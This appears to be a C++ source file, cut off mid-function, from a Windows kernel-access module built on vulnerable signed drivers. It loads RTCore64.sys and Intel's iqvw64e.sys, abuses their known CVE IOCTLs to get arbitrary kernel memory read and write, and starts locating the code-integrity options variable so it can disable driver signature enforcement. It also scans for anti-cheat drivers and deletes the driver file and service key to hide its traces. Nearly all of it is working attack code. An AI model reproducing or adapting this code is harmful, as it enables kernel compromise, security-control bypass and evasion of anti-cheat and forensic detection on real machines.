#include "../dllmain.h"
#include "KernDrv.h"

#include <winternl.h>
#include <intrin.h>
#include <vector>
#include <mutex>
#include <cstdio>
#include <cstring>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace
{
    // ------------------------------------------------------------------
    // ntdll 入口（避免链接期依赖，和 KDU 的用法保持一致）
    // ------------------------------------------------------------------
    typedef NTSTATUS(NTAPI* PFN_NT_LOAD_DRIVER)(PUNICODE_STRING);
    typedef NTSTATUS(NTAPI* PFN_NT_UNLOAD_DRIVER)(PUNICODE_STRING);
    typedef NTSTATUS(NTAPI* PFN_NT_DEVICE_IO_CONTROL_FILE)(
        HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK,
        ULONG, PVOID, ULONG, PVOID, ULONG);
    typedef NTSTATUS(NTAPI* PFN_NT_QUERY_SYSTEM_INFORMATION)(ULONG, PVOID, ULONG, PULONG);

    struct NtApi
    {
        PFN_NT_LOAD_DRIVER              LoadDriver = nullptr;
        PFN_NT_UNLOAD_DRIVER            UnloadDriver = nullptr;
        PFN_NT_DEVICE_IO_CONTROL_FILE   DeviceIoControlFile = nullptr;
        PFN_NT_QUERY_SYSTEM_INFORMATION QuerySystemInformation = nullptr;

        bool Resolve()
        {
            HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
            if (!ntdll)
                return false;

            if (!LoadDriver)
                LoadDriver = (PFN_NT_LOAD_DRIVER)GetProcAddress(ntdll, "NtLoadDriver");
            if (!UnloadDriver)
                UnloadDriver = (PFN_NT_UNLOAD_DRIVER)GetProcAddress(ntdll, "NtUnloadDriver");
            if (!DeviceIoControlFile)
                DeviceIoControlFile = (PFN_NT_DEVICE_IO_CONTROL_FILE)GetProcAddress(ntdll, "NtDeviceIoControlFile");
            if (!QuerySystemInformation)
                QuerySystemInformation = (PFN_NT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");

            return LoadDriver && UnloadDriver && DeviceIoControlFile;
        }
    };

    NtApi g_nt;

    // ------------------------------------------------------------------
    // 漏驱 provider 状态
    // ------------------------------------------------------------------
    HANDLE       g_device = INVALID_HANDLE_VALUE;
    kern::Provider g_provider = kern::Provider::None;
    std::wstring g_loadedService;
    std::mutex   g_accessLock;

    uintptr_t    g_ciOptions = 0;
    bool         g_dsePatched = false;
    uint32_t     g_originalCiOptions = 0;    // 改写前的原始值：还原必须写回它，不能写死 0x6
    bool         g_originalCiOptionsValid = false;
    bool         g_borrowedDevice = false;   // 复用了别人加载的实例，收尾不卸载它

    // RTCore64 (MSI Afterburner 4.6.2 / CVE-2019-16098) —— KDU idrv/rtcore.h
    constexpr ULONG kRtIoctlReadVm = 0x80002048;
    constexpr ULONG kRtIoctlWriteVm = 0x8000204C;

    struct RTCORE_REQUEST
    {
        ULONG_PTR Unknown0;
        ULONG_PTR Address;
        ULONG_PTR Unknown1;
        ULONG     Size;
        ULONG     Value;
        ULONG_PTR Unknown2;
        ULONG_PTR Unknown3;
    };

    static_assert(sizeof(RTCORE_REQUEST) == 0x30, "RTCore64 请求结构必须 0x30 字节");

    // Intel NAL / iqvw64e.sys (CVE-2015-2291) —— KDU idrv/intel.h
    constexpr ULONG kIoctlNalManage = 0x80862007;   // METHOD_NEITHER
    constexpr ULONG_PTR kFuncIdMemmove = 0x33;

    struct NAL_MEMMOVE
    {
        ULONG_PTR FunctionId;
        ULONG_PTR Unused0;
        ULONG_PTR Source;
        ULONG_PTR Destination;
        ULONG_PTR Length;
    };

    // ------------------------------------------------------------------
    // 小工具
    // ------------------------------------------------------------------
    DWORD ReadDwordRegistry(HKEY root, const wchar_t* subKey, const wchar_t* valueName, DWORD defaultValue)
    {
        DWORD value = defaultValue;
        DWORD size = sizeof(value);
        DWORD type = 0;
        if (RegGetValueW(root, subKey, valueName, RRF_RT_REG_DWORD, &type, &value, &size) != ERROR_SUCCESS)
            return defaultValue;
        return value;
    }

    bool ServiceKeyExists(const wchar_t* serviceName)
    {
        const std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + std::wstring(serviceName);
        HKEY hKey = nullptr;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            return true;
        }
        return false;
    }

    std::wstring StripNtPrefix(const wchar_t* path)
    {
        std::wstring value = (path != nullptr) ? path : L"";
        if (value.rfind(L"\\??\\", 0) == 0 || value.rfind(L"\\\\?\\", 0) == 0)
        {
            value.erase(0, 4);
        }
        else if (value.rfind(L"\\SystemRoot\\", 0) == 0)
        {
            wchar_t windowsDirectory[MAX_PATH] = {};
            if (GetWindowsDirectoryW(windowsDirectory, _countof(windowsDirectory)))
                value = std::wstring(windowsDirectory) + value.substr(11);
        }
        return value;
    }

    // 只探测不占用：被别的进程独占时返回 ERROR_SHARING_VIOLATION，同样算“存在”
    bool DevicePresent(const wchar_t* devicePath)
    {
        HANDLE device = CreateFileW(devicePath, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
            OPEN_EXISTING, 0, nullptr);
        if (device != INVALID_HANDLE_VALUE)
        {
            CloseHandle(device);
            return true;
        }
        return GetLastError() == ERROR_SHARING_VIOLATION;
    }

    enum class ImageMatch
    {
        Unknown,   // 找不到同名模块（极少见，交给功能自检）
        Same,      // 已加载的同名模块就是本目录这个文件 -> 这是自己的遗留实例
        Other      // 同名模块来自别的目录 -> 厂商官方驱动
    };

    ImageMatch MatchLoadedImage(const wchar_t* fileName, const std::wstring& expectedPath)
    {
        DWORD needed = 0;
        if (!EnumDeviceDrivers(nullptr, 0, &needed) || needed == 0)
            return ImageMatch::Unknown;

        std::vector<LPVOID> bases(needed / sizeof(LPVOID));
        if (!EnumDeviceDrivers(bases.data(), needed, &needed))
            return ImageMatch::Unknown;

        const std::wstring expected = StripNtPrefix(expectedPath.c_str());
        wchar_t modulePath[MAX_PATH * 2] = {};
        bool sawSameName = false;

        for (LPVOID base : bases)
        {
            if (!GetDeviceDriverFileNameW(base, modulePath, _countof(modulePath)))
                continue;

            const std::wstring actual = StripNtPrefix(modulePath);
            const size_t slash = actual.rfind(L'\\');
            if (slash == std::wstring::npos || _wcsicmp(actual.c_str() + slash + 1, fileName) != 0)
                continue;

            sawSameName = true;
            if (_wcsicmp(actual.c_str(), expected.c_str()) == 0)
                return ImageMatch::Same;
        }

        return sawSameName ? ImageMatch::Other : ImageMatch::Unknown;
    }

    // 只写服务键不启动：用于复用遗留实例后补回键，保证收尾能正常卸载
    bool WriteServiceKey(const std::wstring& imagePath, const std::wstring& serviceName)
    {
        wchar_t fullPath[MAX_PATH * 2] = {};
        if (GetFullPathNameW(imagePath.c_str(), _countof(fullPath), fullPath, nullptr) == 0)
            return false;

        const std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;
        HKEY hKey = nullptr;
        const LSTATUS status = RegCreateKeyExW(
            HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, nullptr,
            REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, nullptr, &hKey, nullptr);
        if (status != ERROR_SUCCESS)
        {
            logger.outDebug(L"[装载] 创建服务键失败: %s (error=%ld)", serviceName.c_str(), status);
            SetLastError(status);
            return false;
        }

        const std::wstring ntImagePath = L"\\??\\" + std::wstring(fullPath);
        const DWORD imageType = 1;   // SERVICE_KERNEL_DRIVER
        const DWORD startType = 3;   // SERVICE_DEMAND_START
        const DWORD errorControl = 0;

        RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
            (const BYTE*)ntImagePath.c_str(),
            (DWORD)((ntImagePath.size() + 1) * sizeof(wchar_t)));
        RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (const BYTE*)&imageType, sizeof(imageType));
        RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (const BYTE*)&startType, sizeof(startType));
        RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (const BYTE*)&errorControl, sizeof(errorControl));
        RegCloseKey(hKey);
        return true;
    }

    void WideFromAnsi(wchar_t* dst, size_t cch, const char* src)
    {
        if (cch == 0)
            return;
        size_t i = 0;
        for (; src[i] != 0 && i + 1 < cch; ++i)
            dst[i] = (wchar_t)(unsigned char)src[i];
        dst[i] = 0;
    }
}

namespace kern
{
    // ==================================================================
    //  1. 驱动服务装载/卸载
    // ==================================================================
    bool EnableLoadDriverPrivilege()
    {
        HANDLE token = nullptr;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
            return false;

        LUID luid = {};
        bool ok = false;
        if (LookupPrivilegeValueW(nullptr, SE_LOAD_DRIVER_NAME, &luid))
        {
            TOKEN_PRIVILEGES tp = {};
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            ok = AdjustTokenPrivileges(token, FALSE, &tp, 0, nullptr, nullptr) != FALSE;
        }

        CloseHandle(token);
        return ok;
    }

    bool LoadDriverImage(const std::wstring& imagePath, const std::wstring& serviceName)
    {
        if (imagePath.empty() || serviceName.empty())
        {
            SetLastError(ERROR_INVALID_PARAMETER);
            return false;
        }

        if (!g_nt.Resolve())
        {
            SetLastError(ERROR_PROC_NOT_FOUND);
            logger.outDebug(L"[装载] 无法解析 ntdll 入口。");
            return false;
        }

        EnableLoadDriverPrivilege();

        // 驱动必须是绝对路径，注册表里写 \??\ 前缀的 NT 路径
        wchar_t fullPath[MAX_PATH * 2] = {};
        if (GetFullPathNameW(imagePath.c_str(), _countof(fullPath), fullPath, nullptr) == 0)
            return false;

        if (GetFileAttributesW(fullPath) == INVALID_FILE_ATTRIBUTES)
        {
            logger.outDebug(L"[装载] 驱动文件不存在: %s", fullPath);
            SetLastError(ERROR_FILE_NOT_FOUND);
            return false;
        }

        if (!WriteServiceKey(fullPath, serviceName))
            return false;

        const std::wstring objectPath =
            L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + serviceName;

        UNICODE_STRING us = {};
        us.Buffer = (PWSTR)objectPath.c_str();
        us.Length = (USHORT)(objectPath.size() * sizeof(wchar_t));
        us.MaximumLength = (USHORT)(us.Length + sizeof(wchar_t));

        const NTSTATUS ntStatus = g_nt.LoadDriver(&us);
        if (!NT_SUCCESS(ntStatus))
        {
            DWORD win32Error = (DWORD)ntStatus;
            SetLastError(win32Error);
            logger.outDebug(L"[装载] NtLoadDriver 失败: %s (NTSTATUS=0x%08X)", serviceName.c_str(), (unsigned)ntStatus);
            return false;
        }

        logger.outDebug(L"[装载] 驱动已进入内核: %s", serviceName.c_str());
        return true;
    }

    bool DeleteDriverService(const std::wstring& serviceName)
    {
        if (serviceName.empty())
            return false;

        NTSTATUS unloadStatus = 0;
        if (g_nt.Resolve())
        {
            const std::wstring objectPath =
                L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + serviceName;
            UNICODE_STRING us = {};
            us.Buffer = (PWSTR)objectPath.c_str();
            us.Length = (USHORT)(objectPath.size() * sizeof(wchar_t));
            us.MaximumLength = (USHORT)(us.Length + sizeof(wchar_t));
            unloadStatus = g_nt.UnloadDriver(&us);
        }

        // 卸载失败（驱动还被句柄占用）时保留服务键，下次启动还能沿"键在"这条路重试，
        // 否则会出现「键没了但驱动还在」的黑洞状态。
        constexpr NTSTATUS kStatusObjectNameNotFound = (NTSTATUS)0xC0000034L;
        const bool unloaded = NT_SUCCESS(unloadStatus) || unloadStatus == kStatusObjectNameNotFound;
        if (!unloaded)
        {
            logger.outDebug(L"[装载] 驱动卸载失败，保留服务键待下次重试: %s (NTSTATUS=0x%08X)",
                serviceName.c_str(), (unsigned)unloadStatus);
            return false;
        }

        const std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;
        const LSTATUS status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath.c_str());
        return status == ERROR_SUCCESS || status == ERROR_FILE_NOT_FOUND;
    }

    // ==================================================================
    //  2. 环境探测（KDU hvdetect 精简）
    // ==================================================================
    HostEnv QueryHostEnv()
    {
        HostEnv env = {};
        g_nt.Resolve();

        int cpuInfo[4] = {};
        __cpuid(cpuInfo, 0);
        const int maxLeaf = cpuInfo[0];

        __cpuid(cpuInfo, 1);
        env.hypervisorPresent = ((cpuInfo[2] >> 31) & 1) != 0;

        if (env.hypervisorPresent && maxLeaf >= 0x40000000)
        {
            char vendor[13] = {};
            __cpuid(cpuInfo, 0x40000000);
            memcpy(vendor + 0, &cpuInfo[1], 4);
            memcpy(vendor + 4, &cpuInfo[2], 4);
            memcpy(vendor + 8, &cpuInfo[3], 4);
            WideFromAnsi(env.hypervisorVendor, _countof(env.hypervisorVendor), vendor);
        }

        DWORD major = 0, minor = 0, build = 0;
        Common::GetNtVersionNumbers(major, minor, build);
        env.majorVersion = major;
        env.minorVersion = minor;
        env.buildNumber = build;

        env.vbsEnabled =
            ReadDwordRegistry(HKEY_LOCAL_MACHINE,
                L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard",
                L"EnableVirtualizationBasedSecurity", 0) != 0;

        // 权威来源：ci.dll 的代码完整性选项
        if (g_nt.QuerySystemInformation)
        {
            struct SYSTEM_CODEINTEGRITY_INFORMATION
            {
                ULONG Length;
                ULONG Options;
            } ci = { sizeof(ci), 0 };

            ULONG returned = 0;
            if (NT_SUCCESS(g_nt.QuerySystemInformation(103 /*SystemCodeIntegrityInformation*/,
                &ci, sizeof(ci), &returned)))
            {
                env.testSigning = (ci.Options & 0x0002) != 0;
                env.hvciEnabled = (ci.Options & (0x1000 | 0x2000 | 0x4000)) != 0;
            }
        }

        return env;
    }

    std::wstring DescribeHostEnv(const HostEnv& env)
    {
        wchar_t buffer[512] = {};
        swprintf_s(buffer, _countof(buffer),
            L"系统 %lu.%lu.%lu | Hypervisor=%s%s%s | VBS=%s | HVCI=%s | TestSign=%s",
            env.majorVersion, env.minorVersion, env.buildNumber,
            env.hypervisorPresent ? L"是" : L"否",
            env.hypervisorPresent && env.hypervisorVendor[0] ? L"(" : L"",
            env.hypervisorPresent && env.hypervisorVendor[0] ? env.hypervisorVendor : L"",
            env.vbsEnabled ? L"开" : L"关",
            env.hvciEnabled ? L"开" : L"关",
            env.testSigning ? L"开" : L"关");

        std::wstring text(buffer);
        if (env.hypervisorPresent && env.hypervisorVendor[0])
            text += L")";
        return text;
    }

    // ==================================================================
    //  3. 漏驱 provider
    // ==================================================================
    static bool RtInvoke(HANDLE device, ULONG ioctl, ULONG_PTR address, ULONG size, ULONG value, ULONG* outValue)
    {
        RTCORE_REQUEST request = {};
        request.Address = address;
        request.Size = size;
        request.Value = value;

        IO_STATUS_BLOCK ios = {};
        const NTSTATUS status = g_nt.DeviceIoControlFile(
            device, nullptr, nullptr, nullptr, &ios,
            ioctl, &request, sizeof(request), &request, sizeof(request));

        if (!NT_SUCCESS(status))
            return false;

        if (outValue)
            *outValue = request.Value;
        return true;
    }

    static bool RtReadBytes(HANDLE device, ULONG_PTR address, void* buffer, size_t size)
    {
        const ULONG_PTR start = address & ~(ULONG_PTR)3;
        const size_t head = (size_t)(address - start);
        const size_t total = head + size;
        const size_t padded = (total + 3) & ~(size_t)3;

        std::vector<BYTE> temp(padded, 0);
        for (size_t offset = 0; offset < padded; offset += 4)
        {
            ULONG value = 0;
            if (!RtInvoke(device, kRtIoctlReadVm, start + offset, 4, 0, &value))
                return false;
            memcpy(temp.data() + offset, &value, 4);
        }

        memcpy(buffer, temp.data() + head, size);
        return true;
    }

    static bool RtWriteBytes(HANDLE device, ULONG_PTR address, const void* buffer, size_t size)
    {
        const ULONG_PTR start = address & ~(ULONG_PTR)3;
        const size_t head = (size_t)(address - start);
        const size_t total = head + size;
        const size_t padded = (total + 3) & ~(size_t)3;

        std::vector<BYTE> temp(padded, 0);
        if (!RtReadBytes(device, start, temp.data(), padded))
            return false;

        memcpy(temp.data() + head, buffer, size);

        for (size_t offset = 0; offset < padded; offset += 4)
        {
            ULONG value = 0;
            memcpy(&value, temp.data() + offset, 4);
            if (!RtInvoke(device, kRtIoctlWriteVm, start + offset, 4, value, nullptr))
                return false;
        }
        return true;
    }

    static bool NalMemmove(HANDLE device, ULONG_PTR source, ULONG_PTR destination, size_t size)
    {
        if (size == 0)
            return true;

        NAL_MEMMOVE request = {};
        request.FunctionId = kFuncIdMemmove;
        request.Source = source;
        request.Destination = destination;
        request.Length = size;

        IO_STATUS_BLOCK ios = {};
        const NTSTATUS status = g_nt.DeviceIoControlFile(
            device, nullptr, nullptr, nullptr, &ios,
            kIoctlNalManage, &request, sizeof(request), nullptr, 0);

        return NT_SUCCESS(status);
    }

    // 指定 provider 的读原语：SelfTest 与 KernelRead 共用
    static bool ReadPrimitive(Provider provider, HANDLE device, uintptr_t virtualAddress, void* buffer, size_t size)
    {
        if (provider == Provider::Iqvw64)
            return NalMemmove(device, virtualAddress, (ULONG_PTR)buffer, size);

        if (provider == Provider::RTCore64)
            return RtReadBytes(device, virtualAddress, buffer, size);

        return false;
    }

    // 功能自检：设备到底是不是同一个漏洞驱动。
    // 读 ci.dll 的 DOS 头，能拿到 MZ 才说明 IOCTL 语义对得上。
    static bool SelfTestDevice(Provider provider, const wchar_t* devicePath)
    {
        const uintptr_t ciBase = KernelModuleBase(L"ci.dll");
        if (ciBase == 0)
            return false;

        HANDLE device = CreateFileW(devicePath, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
            OPEN_EXISTING, 0, nullptr);
        if (device == INVALID_HANDLE_VALUE)
            return false;

        char magic[2] = {};
        const bool ok = ReadPrimitive(provider, device, ciBase, magic, sizeof(magic));
        CloseHandle(device);

        return ok && magic[0] == 'M' && magic[1] == 'Z';
    }

    Provider GetActiveProvider()
    {
        return g_provider;
    }

    const wchar_t* GetActiveProviderName()
    {
        switch (g_provider)
        {
        case Provider::RTCore64: return L"RTCore64";
        case Provider::Iqvw64:   return L"iqvw64e/NAL";
        default:                 return L"无";
        }
    }

    static bool TryOpenProvider(Provider provider, const std::wstring& driverDirectory)
    {
        const wchar_t* fileName = nullptr;
        const wchar_t* serviceName = nullptr;
        const wchar_t* devicePath = nullptr;

        switch (provider)
        {
        case Provider::RTCore64:
            fileName = L"RTCore64.sys";
            serviceName = L"RTCore64F3";   // 独占服务名，避免和用户机器上的残留服务冲突
            devicePath = L"\\\\.\\RTCore64";
            break;
        case Provider::Iqvw64:
            fileName = L"iqvw64e.sys";
            serviceName = L"Iqvw64eF3";    // 不要用 "Nal"，会和 Intel 官方驱动撞名
            devicePath = L"\\\\.\\Nal";
            break;
        default:
            return false;
        }

        const std::wstring imagePath = driverDirectory + fileName;
        if (GetFileAttributesW(imagePath.c_str()) == INVALID_FILE_ATTRIBUTES)
            return false;

        bool devicePresent = DevicePresent(devicePath);
        bool borrowed = false;

        if (ServiceKeyExists(serviceName))
        {
            // 键在 -> 这个名字只有我们会创建，说明是上次留下的实例：卸载后重装
            DeleteDriverService(serviceName);
            devicePresent = DevicePresent(devicePath);
            if (devicePresent)
            {
                // 卸载失败（还有别的句柄在开）时把键补回去，保证收尾还能再卸一次
                WriteServiceKey(imagePath, serviceName);
                logger.outDebug(L"[漏驱] 旧实例未能卸载，复用现有设备: %s", devicePath);
            }
        }
        else if (devicePresent)
        {
            // 键不在但设备在：必须区分「自己崩溃后残留」和「厂商官方驱动占着」
            switch (MatchLoadedImage(fileName, imagePath))
            {
            case ImageMatch::Same:
                logger.outDebug(L"[漏驱] 检测到上次遗留的自身实例，补建服务键后复用: %s", devicePath);
                if (!WriteServiceKey(imagePath, serviceName))
                    return false;
                break;

            case ImageMatch::Other:
                logger.outDebug(L"[漏驱] 设备 %s 属于其它目录的 %s，跳过该 provider。", devicePath, fileName);
                return false;

            default:
                // 枚举不出模块路径的极端情况：用功能自检确认是不是同一个漏洞驱动，
                // 能读通就只借用、不接管它的生命周期（不卸载）
                logger.outDebug(L"[漏驱] 无法确认 %s 的镜像归属，执行功能自检。", devicePath);
                if (!SelfTestDevice(provider, devicePath))
                {
                    logger.outDebug(L"[漏驱] 功能自检失败，跳过该 provider。");
                    return false;
                }
                logger.outDebug(L"[漏驱] 功能自检通过，借用现有实例（不接管卸载）。");
                borrowed = true;
                break;
            }
        }

        if (!devicePresent)
        {
            if (!LoadDriverImage(imagePath, serviceName))
                return false;
        }

        HANDLE device = CreateFileW(devicePath, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
            OPEN_EXISTING, 0, nullptr);
        if (device == INVALID_HANDLE_VALUE)
        {
            logger.outDebug(L"[漏驱] 设备打开失败: %s (error=%lu)", devicePath, GetLastError());
            DeleteDriverService(serviceName);
            return false;
        }

        g_device = device;
        g_provider = provider;
        g_loadedService = serviceName;
        g_borrowedDevice = borrowed;
        logger.outDebug(L"[漏驱] provider 就绪: %s (%s)", GetActiveProviderName(), fileName);
        return true;
    }

    bool OpenKernelAccess(const std::wstring& driverDirectory)
    {
        std::lock_guard<std::mutex> lock(g_accessLock);

        if (g_device != INVALID_HANDLE_VALUE)
            return true;

        if (!g_nt.Resolve())
        {
            logger.outDebug(L"[漏驱] ntdll 入口解析失败。");
            return false;
        }

        // 顺序：RTCore64 优先（体积小、不会和厂商官方驱动撞设备名），失败回退 NAL
        for (Provider provider : { Provider::RTCore64, Provider::Iqvw64 })
        {
            if (TryOpenProvider(provider, driverDirectory))
                return true;
        }

        logger.outDebug(L"[漏驱] 没有可用的 provider（检查 RTCore64.sys / iqvw64e.sys 是否存在且未被拦截）。");
        return false;
    }

    void CloseKernelAccess()
    {
        std::lock_guard<std::mutex> lock(g_accessLock);

        if (g_device != INVALID_HANDLE_VALUE)
        {
            CloseHandle(g_device);
            g_device = INVALID_HANDLE_VALUE;
        }

        if (!g_loadedService.empty())
        {
            if (g_borrowedDevice)
            {
                logger.outDebug(L"[漏驱] 借用实例保留原地，不接管卸载: %s", g_loadedService.c_str());
            }
            else
            {
                DeleteDriverService(g_loadedService);
                logger.outDebug(L"[漏驱] provider 已卸载: %s", g_loadedService.c_str());
            }
            g_loadedService.clear();
        }
        g_borrowedDevice = false;

        g_provider = Provider::None;
    }

    bool KernelRead(uintptr_t virtualAddress, void* buffer, size_t size)
    {
        if (g_device == INVALID_HANDLE_VALUE || buffer == nullptr || size == 0)
            return false;

        return ReadPrimitive(g_provider, g_device, virtualAddress, buffer, size);
    }

    bool KernelWrite(uintptr_t virtualAddress, const void* buffer, size_t size)
    {
        if (g_device == INVALID_HANDLE_VALUE || buffer == nullptr || size == 0)
            return false;

        if (g_provider == Provider::Iqvw64)
            return NalMemmove(g_device, (ULONG_PTR)buffer, virtualAddress, size);

        if (g_provider == Provider::RTCore64)
            return RtWriteBytes(g_device, virtualAddress, buffer, size);

        return false;
    }

    bool KernelRead32(uintptr_t virtualAddress, uint32_t* value)
    {
        return value != nullptr && KernelRead(virtualAddress, value, sizeof(*value));
    }

    bool KernelWrite32(uintptr_t virtualAddress, uint32_t value)
    {
        return KernelWrite(virtualAddress, &value, sizeof(value));
    }

    // ==================================================================
    //  4. 内核模块基址
    // ==================================================================
    uintptr_t KernelModuleBase(const wchar_t* moduleName)
    {
        if (moduleName == nullptr)
            return 0;

        DWORD needed = 0;
        if (!EnumDeviceDrivers(nullptr, 0, &needed) || needed == 0)
            return 0;

        std::vector<LPVOID> bases(needed / sizeof(LPVOID));
        if (!EnumDeviceDrivers(bases.data(), needed, &needed))
            return 0;

        wchar_t baseName[MAX_PATH] = {};
        for (LPVOID base : bases)
        {
            if (GetDeviceDriverBaseNameW(base, baseName, _countof(baseName)) &&
                _wcsicmp(baseName, moduleName) == 0)
            {
                return (uintptr_t)base;
            }
        }
        return 0;
    }

    // ==================================================================
    //  4.1 装载痕迹清理（P1）
    // ==================================================================
    bool HideDriverImageFile(const std::wstring& imagePath)
    {
        if (imagePath.empty())
        {
            SetLastError(ERROR_INVALID_PARAMETER);
            return false;
        }

        wchar_t fullPath[MAX_PATH * 2] = {};
        if (GetFullPathNameW(imagePath.c_str(), _countof(fullPath), fullPath, nullptr) == 0)
        {
            return false;
        }

        // 必须带 DELETE 权限 + FILE_SHARE_DELETE：
        // 内核里可能仍持有该映像的 section 引用，没带共享标志的打开会直接失败。
        HANDLE file = CreateFileW(fullPath, DELETE | FILE_READ_ATTRIBUTES | SYNCHRONIZE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr,
            OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, nullptr);
        if (file == INVALID_HANDLE_VALUE)
        {
            logger.outDebug(L"[清理] 无法打开驱动镜像（可能仍被独占引用）: %s (error=%lu)",
                fullPath, GetLastError());
            return false;
        }

        // FILE_FLAG_DELETE_ON_CLOSE 在最后一个句柄关闭时生效，这里主动关闭以触发删除。
        CloseHandle(file);

        if (GetFileAttributesW(fullPath) != INVALID_FILE_ATTRIBUTES)
        {
            logger.outDebug(L"[清理] 驱动镜像仍留在磁盘上: %s", fullPath);
            return false;
        }

        logger.outDebug(L"[清理] 驱动镜像已从磁盘移除: %s", fullPath);
        return true;
    }

    bool RemoveServiceKeyOnly(const std::wstring& serviceName)
    {
        if (serviceName.empty())
        {
            SetLastError(ERROR_INVALID_PARAMETER);
            return false;
        }

        const std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;
        const LSTATUS status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath.c_str());
        if (status == ERROR_SUCCESS || status == ERROR_FILE_NOT_FOUND)
        {
            logger.outDebug(L"[清理] 服务键已删除: %s", serviceName.c_str());
            return true;
        }

        logger.outDebug(L"[清理] 服务键删除失败: %s (status=%ld)", serviceName.c_str(), status);
        return false;
    }

    std::wstring DetectResidentAntiCheat()
    {
        // 只做名字级探测：不需要内核权限，也不触碰任何反作弊自己的结构。
        // 命中就说明对方已经在内核里，此刻再装载任何映像都会被它的 LoadImageNotify 直接看到。
        static const wchar_t* const kKnownModules[] =
        {
            L"ACE-BASE.sys",        // 腾讯 ACE 主防线
            L"ACE-CORE.sys",
            L"ACE-CORE30405.sys",
            L"ACE-CORE.sys2",
            L"ACE-CORE.sys3",
            L"ACE-GAME.sys",        // ACE 游戏专用（NMI 回调）
            L"ACE-BOOT.sys",        // ACE ELAM
            L"ACE-SSC-DRV64.sys",
            L"TesSafe.sys",         // 腾讯其它守护
            L"TenRPCS.sys",
            L"BEDaisy.sys",         // BattlEye
            L"EasyAntiCheat.sys",   // EAC
            L"EasyAntiCheat_EOS.sys",
            L"vgk.sys",             // Riot Vanguard
        };

        for (const wchar_t* moduleName : kKnownModules)
        {
            if (KernelModuleBase(moduleName) != 0)
            {
                return std::wstring(moduleName);
            }
        }
        return std::wstring();
    }

    // ==================================================================
    //  5. ci!g_CiOptions 定位（dsefix 移植，构建无关）
    // ==================================================================
    namespace
    {
        struct CiImageInfo
        {
            uintptr_t base = 0;
            ULONG     sizeOfImage = 0;
            ULONG     exportRva = 0;
            ULONG     sizeOfHeaders = 0;
            USHORT    numberOfSections = 0;
            USHORT    sizeOfOptionalHeader = 0;
            uintptr_t sectionTable = 0;
        };

        struct CiSectionInfo
        {
            char  name[9];
            ULONG virtualAddress;
            ULONG virtualSize;
            ULONG characteristics;
        };

        bool ParseCiImage(CiImageInfo* info)
        {
            const uintptr_t base = KernelModuleBase(L"ci.dll");
            if (base == 0)
            {
                logger.outDebug(L"[DSE] 找不到 ci.dll 基址。");
                return false;
            }

            BYTE dos[0x40] = {};
            if (!KernelRead(base, dos, sizeof(dos)) || dos[0] != 'M' || dos[1] != 'Z')
            {
                logger.outDebug(L"[DSE] 读取 ci.dll DOS 头失败。");
                return false;
            }

            const ULONG e_lfanew = *(ULONG*)(dos + 0x3C);
            BYTE nt[0x120] = {};
            if (!KernelRead(base + e_lfanew, nt, sizeof(nt)) || *(ULONG*)nt != 0x00004550)
            {
                logger.outDebug(L"[DSE] 读取 ci.dll NT 头失败。");
                return false;
            }

            const USHORT magic = *(USHORT*)(nt + 0x18);
            if (magic != 0x20B)
            {
                logger.outDebug(L"[DSE] ci.dll 不是 PE32+ 镜像 (magic=0x%04X)。", magic);
                return false;
            }

            info->base = base;
            info->numberOfSections = *(USHORT*)(nt + 0x06);
            info->sizeOfOptionalHeader = *(USHORT*)(nt + 0x14);
            info->sizeOfImage = *(ULONG*)(nt + 0x18 + 0x38);
            info->sizeOfHeaders = *(ULONG*)(nt + 0x18 + 0x3C);
            info->exportRva = *(ULONG*)(nt + 0x18 + 0x70);   // DataDirectory[0].VirtualAddress
            info->sectionTable = base + e_lfanew + 0x18 + info->sizeOfOptionalHeader;
            return true;
        }

        bool ValidateCiOptionsCandidate(uintptr_t candidate, const CiImageInfo& info)
        {
            if (candidate < info.base || candidate >= info.base + info.sizeOfImage)
                return false;

            uint32_t value = 0;
            if (!KernelRead32(candidate, &value))
                return false;

            return value == 0x6 || value == 0xE;
        }

        // 路径 A：解析导出表，进 CiInitialize，找 `C7 05 disp32 06 00 00 00`
        bool LocateCiOptionsByExport(const CiImageInfo& info, uintptr_t* result)
        {
            if (info.exportRva == 0)
                return false;

            struct ExportDirectory
            {
                ULONG Characteristics;
                ULONG TimeDateStamp;
                USHORT MajorVersion;
                USHORT MinorVersion;
                ULONG Name;
                ULONG Base;
                ULONG NumberOfFunctions;
                ULONG NumberOfNames;
                ULONG AddressOfFunctions;
                ULONG AddressOfNames;
                ULONG AddressOfNameOrdinals;
            } directory = {};

            if (!KernelRead(info.base + info.exportRva, &directory, sizeof(directory)))
                return false;

